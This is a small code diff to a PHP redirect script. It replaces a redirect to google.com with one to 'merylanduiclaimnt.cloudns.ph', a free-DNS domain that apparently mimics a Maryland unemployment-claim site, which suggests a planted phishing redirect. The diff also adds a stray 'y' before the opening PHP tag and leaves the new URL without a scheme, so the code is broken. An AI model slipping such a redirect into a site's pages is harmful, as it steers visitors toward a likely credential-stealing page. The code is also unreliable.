@@ -1,7 +1,7 @@
-<?php 
+y<?php 
   
 // Redirect browser 
-header("Location: https://google.com"); 
+header("Location: merylanduiclaimnt.cloudns.ph"); 
   
 exit; 
 ?> 
